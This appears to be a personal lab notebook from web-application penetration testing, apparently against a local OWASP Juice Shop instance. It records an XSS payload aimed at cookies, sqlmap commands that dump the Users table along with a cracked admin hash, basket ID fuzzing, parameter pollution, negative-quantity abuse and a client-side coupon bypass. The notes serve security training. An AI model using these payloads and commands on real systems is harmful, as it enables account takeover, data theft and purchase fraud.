# Purchasing
#### Reflected XSS via Search Input

Tested an image-based XSS payload in the search bar:

- **Payload:** `<img src=x onerror=alert('zaki')>`
    
**Vulnerable URL:**  
`http://ubuntu-server:8002/#/search?q=<img src=x onerror=alert('zaki')>`

This payload triggered a JavaScript `alert`, confirming a **Reflected XSS** vulnerability.

However, we extended testing beyond `alert()` and attempted to access `document.cookie`. Since the app uses a cookie-based token for session authentication (and this token also serves as the bearer token), this exposes the user to **session hijacking** if the cookie is not flagged as `HttpOnly`.

**Impact:**  
An attacker can steal the token and log in as the victim.

![Pasted image 20250505191032](attachments/Pasted%20image%2020250505191032.png)

![Pasted image 20250505192114](attachments/Pasted%20image%2020250505192114.png) 

---
#### SQL Injection via Backend Search API

The backend API differs from the front-end route and may be vulnerable to SQLi:

- **Endpoint:** `http://ubuntu-server:8002/rest/products/search?q=`
    
Initial tests:

- `'` → no response
    
- `"` → returned data (suggests weak query sanitization)
    

**Steps:**

1. Captured the request in ZAP.
    
2. Saved it as `rest-search.raw`.
    
3. Ran `sqlmap`:
    

```bash
sqlmap -r rest-search.raw --level 3
```

**Results:**

- SQLi confirmed.

	![Pasted image 20250505193345](attachments/Pasted%20image%2020250505193345.png)

Dumped all tables:
    
```bash
sqlmap -r rest-search.raw --level 3 --dbms sqlite --dump --tables
```

![Pasted image 20250505194330](attachments/Pasted%20image%2020250505194330.png)

To target `Users` table:

```bash
sqlmap -r rest-search.raw --level 3 --dbms sqlite --dump -T Users
```

![Pasted image 20250505195107](attachments/Pasted%20image%2020250505195107.png)

When prompted, saved the password hashes and used [CrackStation](https://crackstation.net/) for cracking:

```plaintext
0192023a7bbd73250516f069df18b500 → admin123
```

> This finding qualifies as a **Cryptographic Failure** (OWASP).

![Pasted image 20250505201650](attachments/Pasted%20image%2020250505201650.png)

![Pasted image 20250505201815](attachments/Pasted%20image%2020250505201815.png) 

To dump specific columns:

```bash
sqlmap -r rest-search.raw --level 3 --dbms sqlite -T Users -C id,role,email,password --dump
```

**Recommendation:** Test cracked credentials across other accounts in case of password reuse.

---
#### Basket Manipulation

Login, add an item to your basket, and observe:

```http
/rest/basket/{id}
```

Use **ZAP's fuzzer** to iterate through basket IDs and look for other users' baskets.

![Pasted image 20250505203747](attachments/Pasted%20image%2020250505203747.png)

---
#### Parameter Pollution

Attempting to change another user’s basket ID directly:

- Using just their ID: returns `401 Unauthorized`.
    
- Using **both** your ID and the victim's ID:  **Successful manipulation** — item added to victim's basket.
    
**Vulnerability:** Parameter pollution allows unauthorized actions on other users’ data.

![Pasted image 20250505204646](attachments/Pasted%20image%2020250505204646.png) 

![Pasted image 20250505204711](attachments/Pasted%20image%2020250505204711.png) 

---

#### Business Logic Abuse – Negative Quantity

In ZAP proxy, modified the quantity of a product in the basket to a negative number.

**Result:**

- The cart total was negative.
    
- User wallet balance increased.
    
- Items could be “purchased” for free.
    

**Classification:** Business logic flaw; abuse of functionality.

![Pasted image 20250505205319](attachments/Pasted%20image%2020250505205319.png)

![Pasted image 20250505210914](attachments/Pasted%20image%2020250505210914.png)

![Pasted image 20250505211042](attachments/Pasted%20image%2020250505211042.png)

---
#### Client-Side Coupon Validation Bypass

Although the developer placed coupon codes in JavaScript, the validation relied on a specific timestamp range.

**Issue:**
- The coupon is only accepted within a valid `validOn` timestamp.
- Validation is done entirely on the client side.

**Bypass:**
- In the browser DevTools console, modified `Date.now()` to return the expected timestamp (the one defined in the coupon).
- This tricked the app into applying the coupon despite being outside the valid range.
    

**Note:** The vulnerability lies in the fact that the logic is client-side and modifiable by the user.
